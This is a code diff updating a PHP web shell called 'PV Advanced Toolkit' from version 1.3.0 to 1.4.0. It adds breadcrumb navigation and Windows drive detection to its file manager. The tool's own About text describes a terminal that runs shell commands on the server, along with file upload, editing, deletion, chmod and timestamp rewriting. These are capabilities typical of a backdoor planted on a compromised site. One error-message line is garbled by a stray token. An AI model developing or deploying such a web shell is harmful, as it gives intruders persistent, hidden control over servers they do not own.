@@ -568,6 +568,52 @@ function do_dns_lookup($host) {
     return $output;
 }
 
+/**
+ * Generates breadcrumb data for a given path.
+ *
+ * @param string $path The file path.
+ * @return array An array of breadcrumb segments.
+ */
+function generate_breadcrumbs($path) {
+    $breadcrumbs = array();
+    $path = rtrim(str_replace('\\', '/', $path), '/'); // Normalize to forward slashes
+    $is_windows = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
+    $current_path_builder = '';
+
+    if ($is_windows) {
+        if (preg_match('/^([a-zA-Z]:)/', $path, $matches)) {
+            $root_name = $matches[1];
+            $current_path_builder = $root_name . '/';
+            $breadcrumbs[] = array('name' => $root_name, 'path' => str_replace('/', DIRECTORY_SEPARATOR, $current_path_builder));
+            $path = ltrim(substr($path, strlen($root_name)), '/');
+        } else {
+             return $breadcrumbs;
+        }
+    } else {
+        // --- MODIFICATION: Changed name from 'root' to '/' for Linux root ---
+        $breadcrumbs[] = array('name' => '/', 'path' => '/');
+        $current_path_builder = '/';
+        $path = ltrim($path, '/');
+    }
+
+    if (empty($path)) {
+        return $breadcrumbs;
+    }
+
+    $parts = explode('/', $path);
+
+    foreach ($parts as $part) {
+        if (empty($part)) continue;
+        if (substr($current_path_builder, -1) !== '/') {
+            $current_path_builder .= '/';
+        }
+        $current_path_builder .= $part;
+        $breadcrumbs[] = array('name' => $part, 'path' => str_replace('/', DIRECTORY_SEPARATOR, $current_path_builder));
+    }
+
+    return $breadcrumbs;
+}
+
 function getServerInfoDetails() {
     // --- COMPATIBILITY: Changed [] to array() for PHP < 5.4 ---
     $info = array();
@@ -772,26 +818,44 @@ if ($authenticated && isset($_POST['ajax_action'])) {
 
         case 'get_file_listing':
             header('Content-Type: application/json');
-            // --- COMPATIBILITY: Changed [] to array() for PHP < 5.4 ---
             $response = array('status' => 'error', 'message' => 'Invalid AJAX action.');
-            // --- COMPATIBILITY: Replaced ?? with isset() ternary for PHP < 7.0 ---
             $fm_path = isset($_POST['path']) ? $_POST['path'] : $current_ajax_cwd;
             $term_cwd_backup = getcwd();
 
-            if(!@chdir($fm_path)) {
+            $is_windows = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
+            $drives = array();
+            if ($is_windows) {
+                foreach (range('A', 'Z') as $drive) {
+                    if (is_dir($drive . ':\\')) {
+                        $drives[] = $drive . ':';
+                    }
+                }
+            }
+            
+            // --- MODIFICATION: Persist breadcrumbs on chdir error ---
+            if (!@chdir($fm_path)) {
                 $response['message'] = 'Could not access path: ' . htmlspecialchars($fm_path);
-                $response['path'] = htmlspecialchars($term_cwd_backup);
+                $response['path'] = htmlspecialchars($fm_path); // Return the failed path
+                $response['breadcrumbs'] = generate_breadcrumbs($fm_path);
+                $response['drives'] = $drives;
+                $response['ds'] = DIRECTORY_SEPARATOR;
                 @chdir($term_cwd_backup);
                 echo json_encode($response);
                 exit;
             }
+            
             $realPath = getcwd();
             $_SESSION['filemanager_cwd'] = $realPath;
+            $breadcrumbs_data = generate_breadcrumbs($realPath);
             $items = @scandir($realPath);
 
+            // --- MODIFICATION: Persist breadcrumbs on scandir error ---
             if ($items === false) {
                 $response['message'] = 'Could not read directory: ' . htmlspecialchars($realPath);
                 $response['path'] = htmlspecialchars($realPath);
+                $response['breadcrumbs'] = $breadcrumbs_data;
+                $response['drives'] = $drives;
+                $response['ds'] = DIRECTORY_SEPARATOR;
                 @chdir($term_cwd_backup);
                 echo json_encode($response);
                 exit;
@@ -893,7 +957,6 @@ if ($authenticated && isset($_POST['ajax_action'])) {
                 }
 
                 $size = $isDir ? '-' : formatSizeUnits(@filesize($itemPath));
-                // --- COMPATIBILITY: Changed [] to array() for PHP < 5.4 ---
                 $entry = array(
                     'name' => $item,
                     'type' => $isDir ? 'dir' : 'file',
@@ -917,7 +980,15 @@ if ($authenticated && isset($_POST['ajax_action'])) {
             });
             usort($files_list, function($a, $b) { return strcasecmp($a['name'], $b['name']); });
 
-            $response = array('status' => 'success', 'files' => array_merge($dirs, $files_list), 'path' => htmlspecialchars($realPath));
+            $response = array(
+                'status' => 'success',
+                'files' => array_merge($dirs, $files_list),
+                'path' => htmlspecialchars($realPath),
+                'breadcrumbs' => $breadcrumbs_data,
+                'drives' => $drives,
+                'ds' => DIRECTORY_SEPARATOR
+            );
+
             @chdir($term_cwd_backup);
             echo json_encode($response);
             exit;
@@ -1149,7 +1220,7 @@ if ($authenticated && isset($_POST['ajax_action'])) {
                 if (!$path) {
                     $response['message'] = '[Error] Item not found: ' . htmlspecialchars($_POST['path']);
                 } elseif ($timestamp === false) {
-                    $response['message'] = '[Error] Invalid date/time format provided: ' . htmlspecialchars($_POST['datetime_str']) . '. Use YYYY-MM-DD HH:MM:SS.';
+                    $response['message'] = '[Error] Invalid date/time format provided: ' . htmlspecialchars($_POST['datetime_str']) . '. Use<x_bin_342>-MM-DD HH:MM:SS.';
                 } else {
                     if (@touch($path, $timestamp)) {
                         $response = array('status' => 'success', 'message' => 'Timestamp updated for ' . htmlspecialchars(basename($path)) . ' to ' . date("Y-m-d H:i:s", $timestamp));
@@ -1269,7 +1340,7 @@ endif;
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Advanced Toolkit v1.3.0</title>
+    <title>Advanced Toolkit v1.4.0</title>
     <link rel="icon" href="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZmlsbD0iIzBmZiIgZD0iTTEyIDJDNi40NzcgMiAyIDYuNDc3IDIgMTJzNC40NzcgMTAgMTAgMTAgMTAtNC40NzcgMTAtMTBTMTcuNTIzIDIgMTIgMnptMCAxOGMtNC40MTEgMC04LTMuNTg5LTgtOHMzLjU4OS04IDgtOCA4IDMuNTg5IDggOC0zLjU4OSA4LTggOHpNODUuNSAxMC41Yy44MjggMCAxLjUuNjcyIDEuNSAxLjVzLS42NzIgMS41LTEuNSAxLjVNNyAxMi44MjggNyAxMnMuNjcyLTEuNSAxLjUtMS41em03IDBjLjgyOCAwIDEuNS42NzIgMS41IDEuNXMwLS42NzIgMS41LTEuNSAxLjVTMTQgMTIuODI4IDE0IDEyczAuNjcyLTEuNSAxLjUtMS41em0tMy41IDRjLTIuMzMxIDAtNC4zMS0xLjQ2NS01LjExNi0zLjVoMTAuMjMyQzE2LjMxIDE2LjAzNSAxNC4zMzEgMTcuNSAxMiAxNy41eiIvPjwvc3ZnPg==">
     <link href="https://fonts.googleapis.com/css2?family=Orbitron&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
@@ -1290,12 +1361,14 @@ endif;
         #terminal-output .error { color: #f00; } #terminal-output .info { color: #0cc; }
         #terminal-output .html-error-container iframe { width: 100%; height: 350px; border: 1px dashed #f00; background: #fff; }
         #command-input { width: calc(100% - 22px); background: #111; border: 1px solid #0ff; color: #0ff; padding: 10px; font-family: 'Consolas', 'Monaco', monospace; border-radius: 5px; }
-        #file-manager-path { margin-bottom: 10px; font-weight: bold; color: #0cc; display:flex; align-items:center; gap:10px; flex-wrap:wrap;}
-        #file-manager-path span { word-break: break-all; }
-        #file-manager-path input[type="text"] { background: #222; border: 1px solid #077; color: #0ff; padding: 5px; border-radius: 3px; flex-grow:1; min-width:200px;}
+        #file-manager-path-container { margin-bottom: 10px; }
+        #drive-list { margin-bottom: 10px; display: flex; flex-wrap: wrap; gap: 10px; }
+        #file-manager-path { display: flex; align-items: center; flex-wrap: wrap; background: #000; padding: 8px; border-radius: 4px; border: 1px solid #055; min-height: 20px;}
+        #file-manager-path a { color: #0ff; text-decoration: none; padding: 0 2px;}
+        #file-manager-path a:hover { text-decoration: underline; color: #0aa;}
+        #file-manager-path span.separator { color: #077; }
         .inputzbut { background: #0ff; border: none; color: #000; font-weight: bold; padding: 10px 15px; cursor: pointer; border-radius: 4px; transition: all 0.3s ease; font-family: 'Orbitron', sans-serif;}
         .inputzbut:hover { background: #0aa; box-shadow: 0 0 10px #0aa; }
-        #file-manager-path button { padding: 5px 10px; }
         .file-table { width: 100%; border-collapse: collapse; margin-top:10px; table-layout: auto; }
         .file-table th, .file-table td {
             border: 1px solid #055;
@@ -1357,7 +1430,7 @@ endif;
 <body>
     <div class="container">
         <header>
-            <h1>💀 PV Advanced Toolkit v1.3.0</h1>
+            <h1>💀 PV Advanced Toolkit v1.4.0</h1>
             <form method="post" class="logout-form">
                 <input type="hidden" name="action" value="logout">
                 <button type="submit">Logout</button>
@@ -1369,7 +1442,8 @@ endif;
             <span class="tab-link" data-tab="serverinfo">Server Info</span>
             <span class="tab-link" data-tab="network">Network Tools</span>
             <span class="tab-link" data-tab="phpinfo" id="phpinfo-tab-button">PHP Info</span>
-            <span class="tab-link" data-tab="about">About</span> </div>
+            <span class="tab-link" data-tab="about">About</span>
+        </div>
 
         <div id="terminal" class="tab-content active">
             <div id="terminal-output"></div>
@@ -1377,10 +1451,11 @@ endif;
         </div>
 
         <div id="filemanager" class="tab-content">
-            <div id="file-manager-path">
-                <span>Path: <span id="current-path-display"></span></span>
-                <input type="text" id="file-manager-path-input" placeholder="Enter path">
-                <button id="file-manager-go-btn" class="inputzbut" style="padding: 5px 10px;">Go</button>
+            <div id="file-manager-path-container">
+                <div id="drive-list"></div>
+                <div id="file-manager-path">
+                    <!-- Breadcrumbs will be generated here by JS -->
+                </div>
             </div>
             <div class="button-bar">
                  <input type="file" id="file-upload-input" class="hidden" multiple>
@@ -1469,7 +1544,7 @@ endif;
                     <img src="https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExNjZwdGpicmw2bmZwcHpmcDg1ZGZuZ2t5cWh1cGI0Y2lzdDB6aGh0ZCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9cw/xxlo1yG0pvhJqNhhtj/giphy.gif" alt="Toolkit GIF" style="width: 200px; height: 200px; margin-right: 20px; border-radius: 5px; flex-shrink: 0;">
                     <div style="flex-grow: 1;">
                         <h2>About PV Advanced Toolkit</h2>
-                        <p><strong>Version:</strong> 1.3.0</p>
+                        <p><strong>Version:</strong> 1.4.0</p>
                         <p>This toolkit is a comprehensive PHP-based web shell and server management interface, designed for server administrators and security professionals for system inspection, management, and basic network operations.</p>
                     </div>
                 </div>
@@ -1481,7 +1556,7 @@ endif;
                     <li><strong>Interactive Terminal Emulator:</strong>
                         <ul>
                             <li>Execute shell commands directly on the server.</li>
-                            <li><strong>NEW:</strong> Support for long-running commands (e.g., scripts, network tasks) via real-time output streaming, preventing AJAX timeouts.</li>
+                            <li>Support for long-running commands (e.g., scripts, network tasks) via real-time output streaming, preventing AJAX timeouts.</li>
                             <li>Command history navigation with Up/Down arrow keys.</li>
                             <li>Maintains current working directory per session.</li>
                             <li>Renders HTML from server errors (e.g. 500) directly in the terminal view.</li>
@@ -1489,12 +1564,14 @@ endif;
                     </li>
                     <li><strong>Advanced File Manager:</strong>
                         <ul>
+                            <li><strong>NEW: Breadcrumb Navigation:</strong> Navigate directories easily with clickable breadcrumb links.</li>
+                            <li><strong>NEW: Drive Detection:</strong> Automatically detects and displays available system drives (e.g., C:\, D:\) for quick access on Windows servers.</li>
                             <li>Browse server directories and view file/folder details (name, type, human-readable size, permissions, last modified date).</li>
                             <li>Remembers the last visited directory across page refreshes.</li>
                             <li><strong>File Operations:</strong> View/Edit text files, Download files, Rename files/folders, Change permissions (chmod), Update timestamps (touch), Delete files and folders (recursively for non-empty folders).</li>
                             <li><strong>Creation Tools:</strong> Create new empty files and new folders.</li>
                             <li><strong>File Uploads:</strong> Upload single or multiple files to the current directory.</li>
-                            <li>Easy path navigation via input field, "Go" button, and "Home" button.</li>
+                            <li>Easy navigation via breadcrumbs and a "Home" button.</li>
                             <li>Visual icons for different file types.</li>
                         </ul>
                     </li>
@@ -1528,16 +1605,16 @@ endif;
             </div>
         </div>
 
-    </div> <script>
+    </div>
+<script>
 document.addEventListener('DOMContentLoaded', function() {
     const tabs = document.querySelectorAll('.tab-link');
     const contents = document.querySelectorAll('.tab-content');
     const terminalOutput = document.getElementById('terminal-output');
     const commandInput = document.getElementById('command-input');
     const fileListingBody = document.getElementById('file-listing');
-    const currentPathDisplay = document.getElementById('current-path-display');
-    const pathInput = document.getElementById('file-manager-path-input');
-    const goBtn = document.getElementById('file-manager-go-btn');
+    const driveListContainer = document.getElementById('drive-list');
+    const breadcrumbContainer = document.getElementById('file-manager-path');
     const phpInfoIframe = document.getElementById('phpinfo-iframe');
     const fileViewModal = document.getElementById('file-view-modal');
     const fileModalTitle = document.getElementById('file-modal-title');
@@ -1547,7 +1624,6 @@ document.addEventListener('DOMContentLoaded', function() {
     const fileModalMessage = document.getElementById('file-modal-message');
     const scriptHomeDirectory = '<?php echo addslashes(htmlspecialchars(getcwd())); ?>';
     const initialFileManagerPath = '<?php echo addslashes(htmlspecialchars($fileManagerInitialPath)); ?>';
-    // --- COMPATIBILITY: Replaced ?? with isset() ternary for PHP < 7.0 ---
     const terminalCwdFromServer = '<?php echo addslashes(htmlspecialchars(isset($_SESSION['terminal_cwd']) ? $_SESSION['terminal_cwd'] : getcwd())); ?>';
     let currentFileManagerPath = initialFileManagerPath;
     let currentTerminalCwd = terminalCwdFromServer;
@@ -1680,8 +1756,6 @@ document.addEventListener('DOMContentLoaded', function() {
             }
             if (responseData.path) {
                 currentFileManagerPath = responseData.path;
-                 currentPathDisplay.textContent = htmlEntities(currentFileManagerPath);
-                 pathInput.value = currentFileManagerPath;
             }
             return responseData;
         } catch (error) {
@@ -1825,18 +1899,52 @@ document.addEventListener('DOMContentLoaded', function() {
     }
 
     async function fetchFiles(path) {
-        pathInput.value = path;
-        currentPathDisplay.textContent = htmlEntities(path);
         fileListingBody.innerHTML = `<tr><td colspan="7" style="text-align:center;">Loading files for ${htmlEntities(path)}...</td></tr>`;
 
         const result = await sendAjaxRequest('get_file_listing', { path: path });
+
+        // Always clear and re-render navigation elements, even on error
+        driveListContainer.innerHTML = '';
+        breadcrumbContainer.innerHTML = '';
+
+        // Render drives if available (for Windows)
+        if (result.drives && result.drives.length > 0) {
+            result.drives.forEach(drive => {
+                const driveBtn = document.createElement('button');
+                driveBtn.className = 'inputzbut';
+                driveBtn.textContent = drive + '\\';
+                driveBtn.style.padding = '5px 10px';
+                driveBtn.style.fontSize = '0.9em';
+                driveBtn.addEventListener('click', () => fetchFiles(drive + '\\'));
+                driveListContainer.appendChild(driveBtn);
+            });
+        }
+
+        // Render breadcrumbs if available
+        if (result.breadcrumbs && result.breadcrumbs.length > 0) {
+            const separator = result.ds === '\\' ? '\\' : '/';
+            result.breadcrumbs.forEach((crumb, index) => {
+                const crumbLink = document.createElement('a');
+                crumbLink.href = '#';
+                crumbLink.textContent = htmlEntities(crumb.name);
+                crumbLink.addEventListener('click', (e) => { e.preventDefault(); fetchFiles(crumb.path); });
+                breadcrumbContainer.appendChild(crumbLink);
+
+                if (index < result.breadcrumbs.length - 1) {
+                    const sepSpan = document.createElement('span');
+                    sepSpan.className = 'separator';
+                    // On linux, don't add separator right after the root '/'
+                    if (!(separator === '/' && index === 0)) {
+                        sepSpan.textContent = separator;
+                        breadcrumbContainer.appendChild(sepSpan);
+                    }
+                }
+            });
+        }
+
+        // Handle the file listing based on request status
         fileListingBody.innerHTML = '';
-
         if (result.status === 'success') {
-            currentFileManagerPath = result.path;
-            pathInput.value = currentFileManagerPath;
-            currentPathDisplay.textContent = htmlEntities(currentFileManagerPath);
-
             if (!result.files || result.files.length === 0) {
                 fileListingBody.innerHTML = `<tr><td colspan="7" style="text-align:center;">Directory is empty.</td></tr>`;
                 return;
@@ -1861,9 +1969,7 @@ document.addEventListener('DOMContentLoaded', function() {
                 row.insertCell().textContent = file.size;
                 row.insertCell().textContent = file.owner;
                 row.insertCell().innerHTML = `<span style="color:${file.perm_color}; font-weight:bold;">${file.perms}</span>`;
-
                 row.insertCell().textContent = file.modified;
-
                 const actionsCell = row.insertCell();
 
                 if (file.name !== '..') {
@@ -1912,19 +2018,12 @@ document.addEventListener('DOMContentLoaded', function() {
             document.querySelectorAll('.file-link').forEach(link => {
                 link.addEventListener('click', function(e) { e.preventDefault(); openModalWithFile(this.dataset.path, this.dataset.name); });
             });
-
         } else {
-            fileListingBody.innerHTML = `<tr><td colspan="7" style="text-align:center;">Error: ${htmlEntities(result.message)}</td></tr>`;
-            if (result.path) {
-                 currentFileManagerPath = result.path;
-                 pathInput.value = currentFileManagerPath;
-                 currentPathDisplay.textContent = htmlEntities(currentFileManagerPath);
-            }
+            fileListingBody.innerHTML = `<tr><td colspan="7" style="text-align:center; color:red;">${htmlEntities(result.message)}</td></tr>`;
         }
     }
 
-    goBtn.addEventListener('click', () => fetchFiles(pathInput.value.trim()));
-    pathInput.addEventListener('keypress', (e) => { if (e.key === 'Enter') fetchFiles(pathInput.value.trim()); });
+
     document.getElementById('file-manager-home-btn').addEventListener('click', () => fetchFiles(scriptHomeDirectory));
 
 
@@ -1944,7 +2043,7 @@ document.addEventListener('DOMContentLoaded', function() {
             formData.append('files_to_upload[]', this.files[i]);
         }
         const result = await sendAjaxRequest('upload_file', formData, true);
-        uploadStatus.textContent = result.message || (result.status === 'success' ? 'Upload complete!' : 'Upload failed!');
+        showCustomAlert(result.message || (result.status === 'success' ? 'Upload complete!' : 'Upload failed!'), result.status);
         if (result.status === 'success') {
             fetchFiles(currentFileManagerPath);
         }
